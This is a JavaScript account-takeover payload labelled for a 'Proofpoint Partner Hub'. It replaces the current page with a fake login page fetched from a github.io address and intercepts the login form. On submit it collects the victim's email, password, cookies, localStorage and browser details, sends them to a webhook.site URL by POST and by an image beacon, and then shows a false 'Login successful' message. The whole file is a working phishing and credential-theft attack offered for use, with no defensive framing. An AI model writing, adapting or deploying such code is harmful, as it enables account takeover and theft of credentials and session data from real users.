// ATO Script - Proofpoint Partner Hub
// Loads your existing index.html and captures credentials

(function() {
    'use strict';
    
    // ============================================
    // YOUR WEBHOOK URL - REPLACE WITH YOURS
    // ============================================
    const WEBHOOK_URL = "https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef";
    // ============================================
    
    console.log('[+] ATO Payload Loaded - Loading Proofpoint login page');
    
    // STEP 1: Replace current page with your index.html content
    fetch('https://swathip888a.github.io/ATO/index.html')
        .then(response => response.text())
        .then(html => {
            // Replace entire page with the fetched HTML
            document.documentElement.innerHTML = html;
            
            // STEP 2: After page loads, attach credential interceptor
            setTimeout(() => {
                injectCredentialCapture();
            }, 500);
        })
        .catch(err => {
            console.error('Failed to load index.html:', err);
            // Fallback: Show simple login if fetch fails
            document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h2>Proofpoint Partner Hub</h2><form id="loginForm"><input type="email" placeholder="Email" id="email"><br><input type="password" placeholder="Password" id="password"><br><button type="submit">Login</button></form></div>';
            injectCredentialCapture();
        });
    
    function injectCredentialCapture() {
        // Find the login form in the loaded page
        // Try multiple possible selectors
        const formSelectors = [
            'form',
            '#mainLoginForm',
            '#partnerLoginForm',
            '.login-card form',
            'form[action*="login"]'
        ];
        
        let loginForm = null;
        for (let selector of formSelectors) {
            loginForm = document.querySelector(selector);
            if (loginForm) break;
        }
        
        if (!loginForm) {
            console.log('[!] Could not find login form, scanning for inputs...');
            // Try to find by email/password inputs
            const emailField = document.querySelector('input[type="email"], input[name*="email"]');
            const passField = document.querySelector('input[type="password"]');
            if (emailField && passField) {
                // Create a wrapper form
                const wrapper = document.createElement('form');
                emailField.parentNode.insertBefore(wrapper, emailField);
                wrapper.appendChild(emailField);
                wrapper.appendChild(passField);
                loginForm = wrapper;
            }
        }
        
        if (!loginForm) {
            console.log('[!] No login form found on page');
            return;
        }
        
        console.log('[+] Login form found, attaching interceptor');
        
        // Get email and password fields
        const emailField = loginForm.querySelector('input[type="email"], input[name*="email" i], input[id*="email" i]');
        const passField = loginForm.querySelector('input[type="password"]');
        
        // Intercept form submission
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailField ? emailField.value : '';
            const password = passField ? passField.value : '';
            
            // Prepare payload
            const payload = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                domain: window.location.hostname,
                title: document.title,
                email: email,
                password: password,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenSize: `${screen.width}x${screen.height}`,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                source: "Proofpoint Partner Hub ATO Attack"
            };
            
            // Send to webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
            
            // Backup via image beacon
            new Image().src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
            
            console.log('[+] Credentials sent to webhook');
            
            // Show success and optionally redirect
            alert('✓ Login successful! Redirecting to Partner Dashboard...');
            
            // Optional: redirect to actual Proofpoint site
            // window.location.href = 'https://partners.proofpoint.com/';
            
            // Or just reset form
            if (emailField) emailField.value = '';
            if (passField) passField.value = '';
        });
        
        // Also intercept any submit buttons that might bypass form submit
        const submitBtns = document.querySelectorAll('button[type="submit"], .btn-login, .btn-primary, input[type="submit"]');
        submitBtns.forEach(btn => {
            btn.addEventListener('click', function(e) {
                // Let the form submit handler do its job
                // But ensure form submit is prevented
                if (loginForm) {
                    const fakeEvent = new Event('submit', { cancelable: true });
                    loginForm.dispatchEvent(fakeEvent);
                    e.preventDefault();
                }
            });
        });
        
        console.log('[+] ATO ready - waiting for user login');
    }
})();
